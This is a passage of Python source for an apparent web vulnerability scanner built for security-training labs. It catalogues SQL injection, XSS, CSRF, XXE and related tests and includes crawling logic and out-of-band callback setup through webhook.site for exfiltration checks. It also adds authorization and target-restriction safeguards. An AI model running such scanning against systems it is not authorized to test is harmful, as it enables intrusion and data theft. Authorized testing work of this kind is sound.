#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SATRIA Engine -- pemindai SQL injection, XSS, CSRF, Clickjacking, DOM-based, CORS, dan XXE terfokus.

File ini menguji 83 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE):

SQL Injection (01-18):
 01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 02 SQL injection vulnerability allowing login bypass
 03 SQL injection attack, querying the database type and version on Oracle
 04 SQL injection attack, querying the database type and version on MySQL and Microsoft
 05 SQL injection attack, listing the database contents on non-Oracle databases
 06 SQL injection attack, listing the database contents on Oracle
 07 SQL injection UNION attack, determining the number of columns returned by the query
 08 SQL injection UNION attack, finding a column containing text
 09 SQL injection UNION attack, retrieving data from other tables
 10 SQL injection UNION attack, retrieving multiple values in a single column
 11 Blind SQL injection with conditional responses
 12 Blind SQL injection with conditional errors
 13 Visible error-based SQL injection
 14 Blind SQL injection with time delays
 15 Blind SQL injection with time delays and information retrieval
 16 Blind SQL injection with out-of-band interaction
 17 Blind SQL injection with out-of-band data exfiltration
 18 SQL injection with filter bypass via XML encoding

XSS (19-48):
 19 Reflected XSS into HTML context with most tags and attributes blocked
 20 Reflected XSS into HTML context with all tags blocked except custom ones
 21 Reflected XSS with event handlers and href attributes blocked
 22 Reflected XSS with some SVG markup allowed
 23 Reflected XSS in canonical link tag
 24 Reflected XSS into a JavaScript string with single quote and backslash escaped
 25 Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 26 Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
 27 Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 28 Reflected XSS with CSP bypass
 29 DOM XSS with AngularJS sandbox escape without strings
 30 DOM XSS with AngularJS sandbox escape and CSP
 31 Reflected DOM XSS
 32 Stored DOM XSS
 33 Exploiting cross-site scripting to steal cookies
 34 Exploiting cross-site scripting to capture passwords
 35 Exploiting XSS to perform CSRF
 36 Reflected XSS into HTML context with nothing encoded
 37 Stored XSS into HTML context with nothing encoded
 38 DOM XSS in document.write sink using source location.search
 39 DOM XSS in innerHTML sink using source location.search
 40 DOM XSS in jQuery anchor href attribute sink using location.search source
 41 DOM XSS in jQuery selector sink using a hashchange event
 42 Reflected XSS into attribute with angle brackets HTML-encoded
 43 Stored XSS into anchor href attribute with double quotes HTML-encoded
 44 Reflected XSS into a JavaScript string with angle brackets HTML encoded
 45 DOM XSS in document.write sink using source location.search inside a select element
 46 DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 47 Reflected XSS protected by very strict CSP, with dangling markup attack
 48 Reflected XSS with some tags blocked

CSRF (49-59):
 49 CSRF vulnerability with no defenses
 50 CSRF where token validation depends on request method
 51 CSRF where token validation depends on token being present
 52 CSRF where token is not tied to user session
 53 CSRF where token is tied to non-session cookie
 54 CSRF where token is duplicated in cookie
 55 SameSite Lax bypass via method override
 56 SameSite Strict bypass via client-side redirect
 57 SameSite Strict bypass via sibling domain
 58 CSRF where Referer validation depends on header being present
 59 CSRF with broken Referer validation

Clickjacking (60-64):
 60 Basic clickjacking with CSRF token protection
 61 Clickjacking with form input data prefilled from a URL parameter
 62 Clickjacking with a frame buster script
 63 Exploiting clickjacking vulnerability to trigger DOM-based XSS
 64 Multistep clickjacking

Keputusan "terkonfirmasi" dibuat konservatif: payload harus menghasilkan bukti
diferensial yang bisa diulang (respon SQL/UNION, penanda unik, perbandingan
true/false, delay terkontrol, atau interaksi OOB), bukan sekadar satu halaman
berubah. Tanpa bukti kuat statusnya hanya "belum terkonfirmasi".

Cara pakai (hanya pada target yang Anda miliki/berizin):
    python satria_baru.py https://lab-target --authorized
    python satria_baru.py https://lab-target --authorized --oob-webhook-site
    python satria_baru.py https://lab-target --authorized \
        --oob-domain abc123.example.com --oob-poll-url https://poll.example/interactions

OOB memakai domain/poller yang Anda kendalikan, atau webhook.site bila
--oob-webhook-site diberikan. Tanpa keduanya, lab 16/17 dilaporkan belum teruji
secara valid (bukan dianggap aman).
"""

from __future__ import annotations

import argparse
import difflib
import hashlib
import html as html_module
import ipaddress
import json
import os
import random
import re
import socket
import statistics
import string
import sys
import textwrap
import time
import unicodedata
import uuid
from bisect import bisect_left
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Iterable
from urllib.parse import (
    parse_qsl,
    quote_plus,
    urlencode,
    urljoin,
    urlparse,
    urlunparse,
)

import requests
from bs4 import BeautifulSoup

__version__ = "1.0.0"
USER_AGENT = f"SATRIA-Baru/{__version__} (+authorized SQL injection lab scanner)"

# ----------------------------------------------------------------------------
# Kompatibilitas runtime untuk app.py Streamlit.
# app.py memanggil engine.configure_runtime(), engine.persist_scrape_artifacts(),
# engine.run_pipeline(), dan membaca engine.OUTPUT_PDF. Nilai-nilai ini juga
# bisa di-overwrite langsung oleh app.py (mis. engine.RUN_NVD = True), jadi
# run_pipeline() membacanya dari globals() saat dipanggil.
ARTIFACTS_DIR: Path = Path("artifacts")
SCRAPE_PATH = "artifacts/scrape_result.json"
FINDINGS_PATH = "artifacts/findings.json"
OUTPUT_PDF = "artifacts/laporan_kerentanan.pdf"
KIOSAPI_BASE_URL = "https://kiosapi.com/v1"
KIOSAPI_API_KEY = ""
CENSYS_TOKEN = ""
NVD_API_KEY = ""
RUN_ACTIVE_TOOLS = False
RUN_DIR_BRUTE = False
RUN_CENSYS = False
RUN_NVD = False
ENABLE_LLM = False
ALLOW_PARTIAL_TOOLS = False
ACTIVE_SCAN_AUTHORIZED = False
SCAN_DEADLINE_SECONDS = 600.0
_RUNTIME_CONFIG: dict[str, Any] = {"_ignored": []}

# ----------------------------------------------------------------------------
# Katalog: 83 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE).
# ----------------------------------------------------------------------------
CATALOG: list[tuple[int, str, str, str]] = [
    (1, "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", "where_hidden", "high"),
    (2, "SQL injection vulnerability allowing login bypass", "login_bypass", "critical"),
    (3, "SQL injection attack, querying the database type and version on Oracle", "oracle_version", "high"),
    (4, "SQL injection attack, querying the database type and version on MySQL and Microsoft", "mysql_mssql_version", "high"),
    (5, "SQL injection attack, listing the database contents on non-Oracle databases", "non_oracle_listing", "high"),
    (6, "SQL injection attack, listing the database contents on Oracle", "oracle_listing", "high"),
    (7, "SQL injection UNION attack, determining the number of columns returned by the query", "union_column_count", "high"),
    (8, "SQL injection UNION attack, finding a column containing text", "union_text_column", "high"),
    (9, "SQL injection UNION attack, retrieving data from other tables", "union_other_tables", "critical"),
    (10, "SQL injection UNION attack, retrieving multiple values in a single column", "union_multi_value", "critical"),
    (11, "Blind SQL injection with conditional responses", "blind_conditional_responses", "high"),
    (12, "Blind SQL injection with conditional errors", "blind_conditional_errors", "high"),
    (13, "Visible error-based SQL injection", "visible_error", "high"),
    (14, "Blind SQL injection with time delays", "time_delay", "high"),
    (15, "Blind SQL injection with time delays and information retrieval", "time_information", "high"),
    (16, "Blind SQL injection with out-of-band interaction", "oob_interaction", "medium"),
    (17, "Blind SQL injection with out-of-band data exfiltration", "oob_exfiltration", "critical"),
    (18, "SQL injection with filter bypass via XML encoding", "xml_filter_bypass", "critical"),
    (19, "Reflected XSS into HTML context with most tags and attributes blocked", "xss_reflected_tags_blocked", "high"),
    (20, "Reflected XSS into HTML context with all tags blocked except custom ones", "xss_reflected_custom_tag", "high"),
    (21, "Reflected XSS with event handlers and href attributes blocked", "xss_reflected_events_blocked", "high"),
    (22, "Reflected XSS with some SVG markup allowed", "xss_reflected_svg", "high"),
    (23, "Reflected XSS in canonical link tag", "xss_reflected_canonical", "medium"),
    (24, "Reflected XSS into a JavaScript string with single quote and backslash escaped", "xss_reflected_js_string", "high"),
    (25, "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped", "xss_reflected_js_string2", "high"),
    (26, "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped", "xss_stored_onclick", "high"),
    (27, "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped", "xss_reflected_template_literal", "high"),
    (28, "Reflected XSS with CSP bypass", "xss_reflected_csp_bypass", "high"),
    (29, "DOM XSS with AngularJS sandbox escape without strings", "xss_dom_angularjs", "high"),
    (30, "DOM XSS with AngularJS sandbox escape and CSP", "xss_dom_angularjs_csp", "high"),
    (31, "Reflected DOM XSS", "xss_reflected_dom", "high"),
    (32, "Stored DOM XSS", "xss_stored_dom", "high"),
    (33, "Exploiting cross-site scripting to steal cookies", "xss_steal_cookies", "high"),
    (34, "Exploiting cross-site scripting to capture passwords", "xss_capture_passwords", "high"),
    (35, "Exploiting XSS to perform CSRF", "xss_csrf", "high"),
    (36, "Reflected XSS into HTML context with nothing encoded", "xss_reflected_html_nothing_encoded", "high"),
    (37, "Stored XSS into HTML context with nothing encoded", "xss_stored_html_nothing_encoded", "high"),
    (38, "DOM XSS in document.write sink using source location.search", "xss_dom_document_write", "high"),
    (39, "DOM XSS in innerHTML sink using source location.search", "xss_dom_innerhtml", "high"),
    (40, "DOM XSS in jQuery anchor href attribute sink using location.search source", "xss_dom_jquery_href", "high"),
    (41, "DOM XSS in jQuery selector sink using a hashchange event", "xss_dom_jquery_selector", "high"),
    (42, "Reflected XSS into attribute with angle brackets HTML-encoded", "xss_reflected_attribute", "high"),
    (43, "Stored XSS into anchor href attribute with double quotes HTML-encoded", "xss_stored_href", "high"),
    (44, "Reflected XSS into a JavaScript string with angle brackets HTML encoded", "xss_reflected_js_angle_brackets", "high"),
    (45, "DOM XSS in document.write sink using source location.search inside a select element", "xss_dom_document_write_select", "high"),
    (46, "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded", "xss_dom_angularjs_expression", "high"),
    (47, "Reflected XSS protected by very strict CSP, with dangling markup attack", "xss_reflected_csp_dangling", "high"),
    (48, "Reflected XSS with some tags blocked", "xss_reflected_some_tags_blocked", "high"),
    (49, "CSRF vulnerability with no defenses", "csrf_no_defenses", "high"),
    (50, "CSRF where token validation depends on request method", "csrf_token_method", "high"),
    (51, "CSRF where token validation depends on token being present", "csrf_token_presence", "high"),
    (52, "CSRF where token is not tied to user session", "csrf_token_not_tied_session", "high"),
    (53, "CSRF where token is tied to non-session cookie", "csrf_token_non_session_cookie", "high"),
    (54, "CSRF where token is duplicated in cookie", "csrf_double_submit_cookie", "high"),
    (55, "SameSite Lax bypass via method override", "csrf_samesite_lax_method_override", "high"),
    (56, "SameSite Strict bypass via client-side redirect", "csrf_samesite_strict_client_redirect", "high"),
    (57, "SameSite Strict bypass via sibling domain", "csrf_samesite_strict_sibling_domain", "high"),
    (58, "CSRF where Referer validation depends on header being present", "csrf_referer_presence", "high"),
    (59, "CSRF with broken Referer validation", "csrf_referer_broken", "high"),
    (60, "Basic clickjacking with CSRF token protection", "clickjacking_basic_csrf", "medium"),
    (61, "Clickjacking with form input data prefilled from a URL parameter", "clickjacking_prefilled", "medium"),
    (62, "Clickjacking with a frame buster script", "clickjacking_frame_buster", "medium"),
    (63, "Exploiting clickjacking vulnerability to trigger DOM-based XSS", "clickjacking_dom_xss", "high"),
    (64, "Multistep clickjacking", "clickjacking_multistep", "medium"),
    # DOM-based vulnerabilities (65-71)
    (65, "DOM XSS using web messages", "dom_xss_web_messages", "high"),
    (66, "DOM XSS using web messages and a JavaScript URL", "dom_xss_web_messages_js_url", "high"),
    (67, "DOM XSS using web messages and JSON.parse", "dom_xss_web_messages_json_parse", "high"),
    (68, "DOM-based open redirection", "dom_open_redirection", "medium"),
    (69, "DOM-based cookie manipulation", "dom_cookie_manipulation", "medium"),
    (70, "Exploiting DOM clobbering to enable XSS", "dom_clobbering_xss", "high"),
    (71, "Clobbering DOM attributes to bypass HTML filters", "dom_clobbering_attributes_bypass", "high"),
    # CORS (72-74)
    (72, "CORS vulnerability with basic origin reflection", "cors_basic_origin_reflection", "medium"),
    (73, "CORS vulnerability with trusted null origin", "cors_trusted_null_origin", "medium"),
    (74, "CORS vulnerability with trusted insecure protocols", "cors_trusted_insecure_protocols", "medium"),
    # XXE injection (75-83)
    (75, "Exploiting XXE using external entities to retrieve files", "xxe_external_entities_retrieve_files", "high"),
    (76, "Exploiting XXE to perform SSRF attacks", "xxe_ssrf", "high"),
    (77, "Blind XXE with out-of-band interaction", "xxe_blind_oob_interaction", "medium"),
    (78, "Blind XXE with out-of-band interaction via XML parameter entities", "xxe_blind_oob_parameter_entities", "medium"),
    (79, "Exploiting blind XXE to exfiltrate data using a malicious external DTD", "xxe_blind_exfiltrate_malicious_dtd", "high"),
    (80, "Exploiting blind XXE to retrieve data via error messages", "xxe_blind_error_messages", "high"),
    (81, "Exploiting XInclude to retrieve files", "xxe_xinclude_retrieve_files", "high"),
    (82, "Exploiting XXE via image file upload", "xxe_image_file_upload", "high"),
    (83, "Exploiting XXE to retrieve data by repurposing a local DTD", "xxe_repurpose_local_dtd", "high"),
]

def lab_id_for(number: int) -> str:
    if number <= 18:
        return f"sql_injection-{number:02d}"
    if number <= 48:
        return f"xss-{number:02d}"
    if number <= 59:
        return f"csrf-{number:02d}"
    if number <= 64:
        return f"clickjacking-{number:02d}"
    if number <= 71:
        return f"dom-{number:02d}"
    if number <= 74:
        return f"cors-{number:02d}"
    return f"xxe-{number:02d}"

SQL_ERROR_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"ora-\d{4,5}"), "oracle"),
    (re.compile(r"oracle[^<]{0,40}error"), "oracle"),
    (re.compile(r"you have an error in your sql syntax|mysql syntax|mysqlexception|warning.*mysql_"), "mysql"),
    (re.compile(r"postgresql|pg_query\(|pg_exec\(|syntax error at or near|unterminated quoted string"), "postgresql"),
    (re.compile(r"microsoft sql server|odbc sql server|sqlserver|unclosed quotation mark|incorrect syntax near"), "mssql"),
    (re.compile(r"sqlite3?::|sqlite3\.operationalerror|sqlite/jdbc|sqlstate\["), "sqlite"),
]
DB_VERSION_RE = re.compile(
    r"(oracle[^<]{0,60}\d[\d.]+|microsoft sql server[^<]{0,60}\d[\d.]+|"
    r"mysql[^<]{0,40}\d[\d.]+|mariadb[^<]{0,40}\d[\d.]+|postgresql[^<]{0,40}\d[\d.]+|"
    r"\b\d{1,2}\.\d{1,2}\.\d{1,3}(?:[-.][\w.]+)?\b)",
    re.I,
)
AUTH_MARKERS = (
    "welcome back", "you are logged in", "logged in as", "welcome to your account",
    "your account", "my account", "log out", "logout", "sign out", "signout",
    "account dashboard", "dashboard",
)
AUTH_FAILURE_MARKERS = (
    "invalid username or password", "incorrect username", "authentication failed",
    "login failed", "invalid credentials", "unauthorized", "access denied",
)
DESTRUCTIVE_PATH_RE = re.compile(
    r"(?:^|/)(?:logout|log-out|signout|sign-out|delete|remove|checkout|payment|purchase|"
    r"transfer|unsubscribe|empty-cart|clear-cart)(?:/|$)",
    re.I,
)
VOLATILE_REPLACEMENTS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b", re.I), " <UUID> "),
    (re.compile(r"\b[0-9a-f]{32,}\b", re.I), " <TOKEN> "),
    (re.compile(r"\b(?:csrf|authenticity)[^\"'<>:= ]*[:=][^\"'<> ]{8,}", re.I), " csrf=<TOKEN> "),
    (re.compile(r"\b20\d{2}-\d{2}-\d{2}[T ][0-9:.-]+(?:[+-]\d{2}:?\d{2}|Z)?\b"), " <TIMESTAMP> "),
    (re.compile(r"\b\d{10}\b"), " <TS> "),
]
COMMON_TABLE_WORDS = (
    "users", "user", "products", "product", "inventory", "customers", "customer",
    "orders", "order", "items", "item", "accounts", "account", "sessions", "session",
    "tracking", "stock", "stores", "store", "categories", "category", "prices",
)


@dataclass
class Response:
    status: int | None
    url: str
    text: str
    headers: dict[str, str]
    elapsed: float
    error: str | None = None

    @property
    def normalized(self) -> str:
        return normalize_text(self.text)

    @property
    def ok_status(self) -> bool:
        return self.status is not None and 200 <= self.status < 400

    @property
    def is_redirect(self) -> bool:
        return self.status in (301, 302, 303, 307, 308)


@dataclass
class FormSpec:
    page_url: str
    action: str
    method: str
    fields: tuple[tuple[str, str, str], ...]
    has_password: bool = False


@dataclass
class Page:
    url: str
    text: str
    links: list[str] = field(default_factory=list)
    forms: list[FormSpec] = field(default_factory=list)
    cookie_names: dict[str, str] = field(default_factory=dict)
    js_text: str = ""
    status: int | None = None
    headers: dict[str, str] = field(default_factory=dict)


@dataclass
class Point:
    key: str
    kind: str
    label: str
    url: str
    name: str
    original: str
    page_url: str
    method: str = "GET"
    fields: tuple[tuple[str, str, str], ...] = ()
    interest: int = 0

    @property
    def numeric(self) -> bool:
        return bool(re.fullmatch(r"-?\d+(?:\.\d+)?", (self.original or "").strip()))


@dataclass
class Baseline:
    point: Point
    first: Response
    second: Response
    similarity: float

    @property
    def median_elapsed(self) -> float:
        vals = sorted([self.first.elapsed, self.second.elapsed])
        return statistics.median(vals)


@dataclass
class OOBSetup:
    kind: str
    domain: str
    token: str
    poll_url: str | None = None
    webhook_token: str | None = None


def normalize_text(value: str) -> str:
    if not value:
        return ""
    soup = BeautifulSoup(value[:300_000], "html.parser")
    for tag in soup(["script", "style", "noscript"]):
        tag.decompose()
    text = soup.get_text(" ", strip=True) or value[:300_000]
    for pattern, replacement in VOLATILE_REPLACEMENTS:
        text = pattern.sub(replacement, text)
    return re.sub(r"\s+", " ", text).strip()


def similarity(a: str, b: str) -> float:
    if a == b:
        return 1.0
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a[:80_000], b[:80_000], autojunk=False).ratio()


def sql_errors(resp: Response | None) -> list[tuple[str, str]]:
    if resp is None or resp.error:
        return []
    body = (resp.text or "").lower()
    out: dict[str, str] = {}
    for pattern, dbms in SQL_ERROR_PATTERNS:
        for match in pattern.finditer(body):
            out.setdefault(dbms, match.group(0)[:100])
            if len(out) >= 4:
                return sorted(out.items())
    return sorted(out.items())


def has_sql_error(resp: Response | None) -> bool:
    return bool(sql_errors(resp))


def snippet(value: str, limit: int = 240) -> str:
    text = re.sub(r"\s+", " ", html_module.unescape(value or "")).strip()
    return text[:limit]


def version_snippet(resp: Any) -> str:
    """Bukti versi yang bersih (teks saja, bukan HTML mentah)."""
    text = normalize_text(getattr(resp, "text", "") or "")
    marker = re.search(r"SATV[^\s]{0,120}", text)
    if marker:
        return snippet(marker.group(0), 180)
    patterns = [
        r"Oracle Database [^|]{0,120}",
        r"Microsoft SQL Server [^|]{0,90}",
        r"MySQL [^|]{0,80}",
        r"MariaDB [^|]{0,80}",
        r"PostgreSQL [^|]{0,80}",
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.I)
        if match:
            return snippet(match.group(0), 220)
    version_match = DB_VERSION_RE.search(text)
    if version_match:
        return snippet(version_match.group(0), 220)
    return snippet(text, 220)


def random_token(prefix: str = "sat") -> str:
    return prefix + uuid.uuid4().hex[:10].lower()


def mask_secret(secret: str) -> str:
    if not secret:
        return ""
    if len(secret) <= 4:
        return "*" * len(secret)
    return f"{secret[:1]}***{secret[-1:]} (len={len(secret)})"


def is_same_origin(url: str, base: str) -> bool:
    pa, pb = urlparse(url), urlparse(base)
    if pa.scheme not in ("http", "https") or pb.scheme not in ("http", "https"):
        return False
    return (pa.scheme == pb.scheme and (pa.hostname or "").lower() == (pb.hostname or "").lower()
            and (pa.port or (443 if pa.scheme == "https" else 80))
            == (pb.port or (443 if pb.scheme == "https" else 80)))


def canonical_url(url: str) -> str:
    p = urlparse(url)
    return urlunparse((p.scheme, p.netloc, p.path or "/", "", p.query, ""))


def has_volatile_query_value(key: str, value: str) -> bool:
    return bool(re.search(r"(?:csrf|token|nonce|session|sid|ts|timestamp)", key, re.I)) and len(value) >= 8


class SatriaBaruScanner:
    def __init__(
        self,
        target_url: str,
        *,
        authorized: bool = False,
        allow_private: bool = False,
        max_pages: int = 20,
        max_points: int = 24,
        max_requests: int = 520,
        timeout: float = 8.0,
        time_delay: float = 3.0,
        oob_domain: str | None = None,
        oob_poll_url: str | None = None,
        oob_webhook_site: bool = False,
    ):
        self.target_url = self._normalize_target(target_url)
        if not authorized:
            raise ValueError("Pengujian aktif memerlukan --authorized (Anda menyatakan memiliki izin pengujian).")
        if not allow_private:
            self._validate_public_target(self.target_url)
        self.origin = self._origin(self.target_url)
        self.max_pages = max(1, min(max_pages, 40))
        self.max_points = max(4, min(max_points, 60))
        self.max_requests = max(100, min(max_requests, 1200))
        self.timeout = max(3.0, min(timeout, 30.0))
        self.time_delay = max(1.0, min(time_delay, 8.0))
        self.request_count = 0
        self.started = time.monotonic()
        try:
            self.deadline_seconds = float(globals().get("SCAN_DEADLINE_SECONDS") or 600.0)
        except (TypeError, ValueError):
            self.deadline_seconds = 600.0
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cache-Control": "no-cache",
        })
        self.pages: list[Page] = []
        self.points: list[Point] = []
        self._baselines: dict[str, Baseline | None] = {}
        self._union_cols: dict[str, int] = {}
        self._text_col: dict[str, int] = {}
        self._dbms_hint: dict[str, str] = {}
        self._confirmed: dict[int, dict[str, Any]] = {}
        self.stats = {
            "pages_fetched": 0,
            "xml_endpoints": 0,
            "requests": 0,
            "errors": [],
        }
        self.oob = self._setup_oob(oob_domain, oob_poll_url, oob_webhook_site)
        self.oob_status = "configured" if self.oob else "not_configured"

    # ------------------------------------------------------------------
    # Target validation
    # ------------------------------------------------------------------
    @staticmethod
    def _normalize_target(url: str) -> str:
        value = (url or "").strip()
        if not value:
            raise ValueError("Target URL wajib diisi.")
        if not re.match(r"^https?://", value, re.I):
            value = "https://" + value
        p = urlparse(value)
        if p.scheme not in ("http", "https") or not p.hostname:
            raise ValueError("Target harus berupa URL http:// atau https:// yang valid.")
        if p.username or p.password:
            raise ValueError("Jangan sertakan kredensial pada URL target.")
        return urlunparse((p.scheme.lower(), p.netloc, p.path or "/", p.params, p.query, ""))

    @staticmethod
    def _origin(url: str) -> tuple[str, str, int]:
        p = urlparse(url)
        return (p.scheme, (p.hostname or "").lower(), p.port or (443 if p.scheme == "https" else 80))

    def _validate_public_target(self, url: str) -> None:
        host = (urlparse(url).hostname or "").rstrip(".").lower()
        if host in {"localhost", "localhost.localdomain"} or host.endswith((".localhost", ".local", ".internal", ".test", ".invalid")):
            raise ValueError("Target localhost/internal ditolak tanpa --allow-private.")
        p = urlparse(url)
        try:
            records = socket.getaddrinfo(host, p.port or (443 if p.scheme == "https" else 80), type=socket.SOCK_STREAM)
        except socket.gaierror as exc:
            raise ValueError(f"Hostname target tidak dapat di-resolve: {exc}") from exc
        addresses = {item[4][0].split("%", 1)[0] for item in records}
        for address in addresses:
            ip = ipaddress.ip_address(address)
            if not ip.is_global:
                raise ValueError(f"Target mengarah ke IP non-publik ({ip}); pemindaian dihentikan.")

    def _same_origin(self, url: str) -> bool:
        return is_same_origin(url, self.target_url)

    def _within_budget(self) -> bool:
        return self.request_count < self.max_requests and (time.monotonic() - self.started) < self.deadline_seconds

    # ------------------------------------------------------------------
    # OOB setup
    # ------------------------------------------------------------------
    def _setup_oob(self, domain: str | None, poll_url: str | None, webhook_site: bool) -> OOBSetup | None:
        domain = (domain or os.getenv("SATRIA_OOB_DOMAIN") or "").strip().lower().strip(".")
        poll_url = (poll_url or os.getenv("SATRIA_OOB_POLL_URL") or "").strip() or None
        if webhook_site:
            token = self._create_webhook_site_token()
            if token:
                return OOBSetup("webhook_site", "webhook.site", token, f"https://webhook.site/token/{token}/requests", token)
            self.oob_status = "webhook_site_create_failed"
            return None
        if domain:
            return OOBSetup("poll_url" if poll_url else "domain_only", domain, random_token("satria"), poll_url)
        return None

    @staticmethod
    def _create_webhook_site_token() -> str | None:
        try:
            resp = requests.post("https://webhook.site/token", timeout=15)
            resp.raise_for_status()
            token = resp.json().get("uuid")
            return token if isinstance(token, str) and token else None
        except Exception:
            return None

    # ------------------------------------------------------------------
    # HTTP plumbing
    # ------------------------------------------------------------------
    def _request(
        self,
        method: str,
        url: str,
        *,
        session: requests.Session | None = None,
        params: Any = None,
        data: Any = None,
        headers: dict[str, str] | None = None,
        allow_redirects: bool = False,
        timeout: float | None = None,
    ) -> Response:
        if not self._within_budget():
            return Response(None, url, "", {}, 0.0, error="budget_exhausted")
        started = time.monotonic()
        try:
            resp = (session or self.session).request(
                method,
                url,
                params=params,
                data=data,
                headers=headers,
                timeout=timeout or self.timeout,
                allow_redirects=allow_redirects,
            )
            elapsed = time.monotonic() - started
            self.request_count += 1
            self.stats["requests"] = self.request_count
            return Response(
                status=resp.status_code,
                url=resp.url,
                text=resp.text or "",
                headers=dict(resp.headers),
                elapsed=elapsed,
            )
        except requests.RequestException as exc:
            elapsed = time.monotonic() - started
            self.request_count += 1
            self.stats["requests"] = self.request_count
            return Response(None, url, "", {}, elapsed, error=f"{type(exc).__name__}: {str(exc)[:160]}")
        except Exception as exc:
            elapsed = time.monotonic() - started
            self.request_count += 1
            self.stats["requests"] = self.request_count
            return Response(None, url, "", {}, elapsed, error=f"{type(exc).__name__}: {str(exc)[:160]}")

    def _cookie_header(self, name: str | None = None, override: str | None = None) -> str:
        jar: dict[str, str] = {}
        for cookie in self.session.cookies:
            jar[cookie.name] = cookie.value or ""
        if name is not None:
            jar[name] = override or ""
        return "; ".join(f"{k}={v}" for k, v in jar.items())

    def _require_origin(self, url: str) -> bool:
        if not self._same_origin(url):
            self.stats["errors"].append(f"Permintaan lintas-origin ditolak: {url}")
            return False
        return True

    def send(self, point: Point, value: str | None = None) -> Response:
        """Kirim nilai lengkap ke satu titik injeksi."""
        target_value = point.original if value is None else value
        if point.kind == "query":
            return self._request("GET", self._with_query_value(point, target_value))
        if point.kind == "form":
            action, params, data = self._form_request_parts(point, target_value)
            return self._request(point.method, action, params=params, data=data)
        if point.kind == "cookie":
            cookie_value = quote_plus(target_value)
            return self._request(
                "GET",
                point.url,
                headers={"Cookie": self._cookie_header(point.name, cookie_value)},
            )
        if point.kind == "xml":
            body = build_xml_body({point.name: target_value})
            return self._request(
                "POST", point.url, data=body,
                headers={"Content-Type": "application/xml; charset=UTF-8", "Accept": "application/xml,text/plain"},
            )
        return Response(None, point.url, "", {}, 0.0, error="unknown_point_kind")

    @staticmethod
    def _with_query_value(point: Point, value: str) -> str:
        p = urlparse(point.url)
        pairs = parse_qsl(p.query, keep_blank_values=True)
        out: list[tuple[str, str]] = []
        replaced = False
        for key, old in pairs:
            if key == point.name and not replaced:
                out.append((key, value))
                replaced = True
            else:
                out.append((key, old))
        if not replaced:
            out.append((point.name, value))
        return urlunparse((p.scheme, p.netloc, p.path or "/", p.params, urlencode(out, doseq=True), ""))

    def _form_request_parts(self, point: Point, value: str) -> tuple[str, Any, Any]:
        parsed = urlparse(point.url)
        action_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        fields = list(point.fields)
        field_names = {name for name, _, _ in fields}
        merged: list[tuple[str, str]] = []
        replaced = False
        for name, val, _typ in fields:
            if name == point.name and not replaced:
                merged.append((name, value))
                replaced = True
            else:
                merged.append((name, val))
        if not replaced and point.name not in field_names:
            merged.append((point.name, value))
        merged.extend((k, v) for k, v in action_pairs if k not in field_names)
        clean_action = urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.params, "", ""))
        if point.method == "GET":
            return clean_action, urlencode(merged, doseq=True), None
        return clean_action, None, dict(merged)

    # ------------------------------------------------------------------
    # Discovery
    # ------------------------------------------------------------------
    def crawl(self) -> None:
        queue: deque[str] = deque([self.target_url])
        visited: set[str] = set()
        while queue and len(visited) < self.max_pages and self._within_budget():
            url = canonical_url(queue.popleft())
            if url in visited or not self._require_origin(url):
                continue
            visited.add(url)
            resp = self._request("GET", url, allow_redirects=True)
            if resp.error or not resp.text:
                self.stats["errors"].append(f"Crawl gagal {url}: {resp.error}")
                continue
            self.stats["pages_fetched"] += 1
            self._append_page(url, resp)
            for link in self.pages[-1].links:
                if link not in visited and link not in queue and len(visited) + len(queue) < self.max_pages * 3:
                    queue.append(link)
        self._build_points()

    def _append_page(self, url: str, resp: Response) -> None:
        soup = BeautifulSoup(resp.text, "html.parser")
        links: list[str] = []
        for anchor in soup.find_all("a", href=True):
            absolute = urljoin(url, anchor["href"])
            parsed = urlparse(absolute)
            if parsed.scheme not in ("http", "https") or not self._same_origin(absolute):
                continue
            if DESTRUCTIVE_PATH_RE.search(parsed.path or "/"):
                continue
            links.append(canonical_url(absolute))
        forms = self._parse_forms(url, soup)
        js_bits: list[str] = []
        for script in soup.find_all("script"):
            src = script.get("src")
            if src:
                absolute = urljoin(url, src)
                if self._same_origin(absolute) and len(js_bits) < 4 and self._within_budget():
                    js_resp = self._request("GET", absolute)
                    if not js_resp.error and js_resp.text:
                        js_bits.append(js_resp.text[:120_000])
            elif script.string:
                js_bits.append(script.string[:120_000])
        cookies = {c.name: c.value or "" for c in self.session.cookies}
        self.pages.append(Page(
            url=url, text=resp.text, links=list(dict.fromkeys(links)),
            forms=forms, cookie_names=cookies, js_text="\n".join(js_bits), status=resp.status,
            headers=dict(getattr(resp, "headers", {}) or {}),
        ))

    @staticmethod
    def _parse_forms(base: str, soup: BeautifulSoup) -> list[FormSpec]:
        forms: list[FormSpec] = []
        for form in soup.find_all("form"):
            action = urljoin(base, form.get("action") or base)
            method = (form.get("method") or "get").lower()
            fields: list[tuple[str, str, str]] = []
            has_password = False
            for field in form.find_all(["input", "select", "textarea"]):
                name = field.get("name")
